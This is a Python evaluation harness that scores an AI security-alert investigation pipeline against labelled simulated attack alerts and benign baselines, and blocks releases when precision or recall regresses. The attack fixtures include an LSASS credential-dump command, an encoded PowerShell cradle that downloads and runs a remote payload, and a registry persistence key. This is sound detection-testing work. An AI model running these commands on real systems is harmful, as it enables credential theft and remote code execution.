"""
AI Investigation Evaluation Harness.

Scores the multi-agent investigation pipeline against a curated, labelled benchmark dataset
consisting of Atomic Red Team attack simulations and benign operational baselines.
Computes verdict precision, recall, and F1-score, and blocks releases that regress below targets.
"""

from __future__ import annotations

import asyncio
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from app.agents.graph import investigation_graph
from app.core.config import settings
from app.core.logging import logger


class EvaluationRegressionError(RuntimeError):
    """Raised when investigation precision or recall falls below acceptable release thresholds."""
    pass


# Labelled Evaluation Dataset: Atomic Red Team + Benign Baselines
BENCHMARK_DATASET: List[Dict[str, Any]] = [
    # --- Atomic Red Team True Positives ---
    {
        "id": "ART-T1003-LSASS",
        "ground_truth": "true_positive",
        "alert": {
            "_id": "art-lsass-dump",
            "title": "LSASS Memory Dump via ProcDump",
            "rule_name": "credential_dumping_lsass",
            "severity": "critical",
            "host": "DC-PRIMARY",
            "user": "SYSTEM",
            "event_code": "1",
            "command_line": "procdump.exe -ma lsass.exe C:\\temp\\lsass.dmp",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
    {
        "id": "ART-T1059-PS-CRADLE",
        "ground_truth": "true_positive",
        "alert": {
            "_id": "art-powershell-cradle",
            "title": "Suspicious Encoded PowerShell Download Cradle",
            "rule_name": "powershell_download_cradle",
            "severity": "high",
            "host": "WS-FINANCE-02",
            "user": "corp\\analyst",
            "event_code": "4104",
            "command_line": "powershell -enc IEV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xODUuMjIwLjEwMS41L3BheWxvYWQucHMxJyk=",
            "extracted_iocs": ["185.220.101.5"],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [
            {"ioc": "185.220.101.5", "reputation": "malicious", "threat_score": 90, "source": "VirusTotal"}
        ],
    },
    {
        "id": "ART-T1547-REG-RUN",
        "ground_truth": "true_positive",
        "alert": {
            "_id": "art-registry-persistence",
            "title": "Suspicious Run Key Persistence Registry Modification",
            "rule_name": "registry_run_key_persistence",
            "severity": "high",
            "host": "WS-DEV-04",
            "user": "corp\\jdoe",
            "event_code": "13",
            "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BackdoorUpdater",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
    {
        "id": "ART-T1110-BRUTE-SPRAY",
        "ground_truth": "true_positive",
        "alert": {
            "_id": "art-brute-force-spray",
            "title": "High Volume Failed Logons (Password Spray)",
            "rule_name": "brute_force_login",
            "severity": "high",
            "host": "AUTH-GATEWAY",
            "user": "admin",
            "event_code": "4625",
            "source_ip": "194.26.29.112",
            "extracted_iocs": ["194.26.29.112"],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [
            {"ioc": "194.26.29.112", "reputation": "malicious", "threat_score": 95, "source": "AbuseIPDB"}
        ],
    },
    {
        "id": "ART-T1071-C2-BEACON",
        "ground_truth": "true_positive",
        "alert": {
            "_id": "art-c2-beacon",
            "title": "Suspicious Outbound C2 Network Beaconing",
            "rule_name": "dns_suspicious_query",
            "severity": "critical",
            "host": "WS-EXEC-01",
            "user": "corp\\vp",
            "event_code": "22",
            "dns_query": "c2-sync-exfil.xyz",
            "extracted_iocs": ["c2-sync-exfil.xyz"],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [
            {"ioc": "c2-sync-exfil.xyz", "reputation": "malicious", "threat_score": 88, "source": "VirusTotal"}
        ],
    },

    # --- Benign Operational Baselines ---
    {
        "id": "BENIGN-WIN-UPDATE",
        "ground_truth": "benign",
        "alert": {
            "_id": "benign-windows-update",
            "title": "Standard Windows Update Background Orchestration",
            "rule_name": "normal_system_process",
            "severity": "low",
            "host": "WS-EXEC-01",
            "user": "SYSTEM",
            "event_code": "1",
            "command_line": "C:\\Windows\\System32\\UsoClient.exe StartScan",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
    {
        "id": "BENIGN-ADMIN-IPCONFIG",
        "ground_truth": "benign",
        "alert": {
            "_id": "benign-admin-ipconfig",
            "title": "Routine IT Admin Network Discovery",
            "rule_name": "admin_recon",
            "severity": "low",
            "host": "WS-DEV-04",
            "user": "corp\\itadmin",
            "event_code": "1",
            "command_line": "ipconfig.exe /all",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
    {
        "id": "BENIGN-SYS-DEFRAG",
        "ground_truth": "benign",
        "alert": {
            "_id": "benign-disk-defrag",
            "title": "Scheduled Volume Defragmentation Task",
            "rule_name": "scheduled_maintenance",
            "severity": "low",
            "host": "DC-PRIMARY",
            "user": "SYSTEM",
            "event_code": "1",
            "command_line": "defrag.exe C: -v",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
    {
        "id": "BENIGN-DEV-GIT-CLONE",
        "ground_truth": "benign",
        "alert": {
            "_id": "benign-dev-git",
            "title": "Developer Git Repository Clone",
            "rule_name": "developer_tool",
            "severity": "low",
            "host": "WS-DEV-04",
            "user": "corp\\jdoe",
            "event_code": "1",
            "command_line": "git.exe clone https://github.com/corp/frontend.git",
            "extracted_iocs": ["github.com"],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [
            {"ioc": "github.com", "reputation": "benign", "source": "VirusTotal"}
        ],
    },
    {
        "id": "BENIGN-SINGLE-LOGON",
        "ground_truth": "benign",
        "alert": {
            "_id": "benign-user-logon",
            "title": "Normal Workstation Interactive Logon",
            "rule_name": "successful_logon",
            "severity": "low",
            "host": "WS-FINANCE-02",
            "user": "corp\\analyst",
            "event_code": "4624",
            "extracted_iocs": [],
            "created_at": datetime.now(timezone.utc),
        },
        "enrichments": [],
    },
]


async def run_evaluation_benchmark(
    dataset: Optional[List[Dict[str, Any]]] = None,
    enforce_thresholds: bool = True,
) -> Dict[str, Any]:
    """
    Executes the investigation graph across all labelled benchmark alerts.
    Computes confusion matrix, precision, recall, and F1 score.
    Fails release if precision or recall drops below configured targets.
    """
    cases = dataset or BENCHMARK_DATASET
    total_cases = len(cases)
    tp = fp = tn = fn = 0
    results: List[Dict[str, Any]] = []

    logger.info("eval_benchmark_started", total_cases=total_cases)

    for item in cases:
        sample_id = item["id"]
        ground_truth = item["ground_truth"]
        alert = item["alert"]
        enrichments = item.get("enrichments", [])

        state = {
            "alert_data": alert,
            "context": {},
            "extracted_iocs": alert.get("extracted_iocs", []),
            "enrichment_results": enrichments,
            "investigation_log": [],
            "ai_analysis": None,
            "risk_assessment": {},
            "mitre_mappings": [],
            "correlations": [],
            "timeline": [],
            "recommendation": None,
            "recommendation_engine": None,
        }

        # Run pipeline
        final_state = await investigation_graph.ainvoke(state)
        risk = final_state.get("risk_assessment", {})
        risk_score = risk.get("risk_score", 0)
        priority = risk.get("priority", "low").lower()

        # Classification decision threshold: risk >= 50 or priority critical/high -> true_positive
        predicted_verdict = "true_positive" if risk_score >= 50 or priority in ("critical", "high") else "benign"

        if ground_truth == "true_positive":
            if predicted_verdict == "true_positive":
                tp += 1
                classification = "TP"
            else:
                fn += 1
                classification = "FN"
        else:
            if predicted_verdict == "true_positive":
                fp += 1
                classification = "FP"
            else:
                tn += 1
                classification = "TN"

        results.append({
            "id": sample_id,
            "ground_truth": ground_truth,
            "predicted": predicted_verdict,
            "classification": classification,
            "risk_score": risk_score,
            "priority": priority,
        })

    # Metric computations
    precision = (tp / (tp + fp)) if (tp + fp) > 0 else 0.0
    recall = (tp / (tp + fn)) if (tp + fn) > 0 else 0.0
    f1 = (2 * precision * recall / (precision + recall)) if (precision + recall) > 0 else 0.0
    accuracy = (tp + tn) / total_cases if total_cases > 0 else 0.0

    eval_summary = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "total_samples": total_cases,
        "confusion_matrix": {"TP": tp, "FP": fp, "TN": tn, "FN": fn},
        "precision": round(precision, 4),
        "recall": round(recall, 4),
        "f1_score": round(f1, 4),
        "accuracy": round(accuracy, 4),
        "min_precision_threshold": settings.LLM_MIN_EVAL_PRECISION,
        "min_recall_threshold": settings.LLM_MIN_EVAL_RECALL,
        "results": results,
    }

    logger.info(
        "eval_benchmark_complete",
        precision=eval_summary["precision"],
        recall=eval_summary["recall"],
        f1=eval_summary["f1_score"],
        accuracy=eval_summary["accuracy"],
    )

    if enforce_thresholds:
        if precision < settings.LLM_MIN_EVAL_PRECISION:
            msg = f"Release Blocked: AI Precision ({precision:.2f}) regressed below threshold ({settings.LLM_MIN_EVAL_PRECISION})"
            logger.error("eval_precision_regression", error=msg)
            raise EvaluationRegressionError(msg)
        if recall < settings.LLM_MIN_EVAL_RECALL:
            msg = f"Release Blocked: AI Recall ({recall:.2f}) regressed below threshold ({settings.LLM_MIN_EVAL_RECALL})"
            logger.error("eval_recall_regression", error=msg)
            raise EvaluationRegressionError(msg)

    return eval_summary

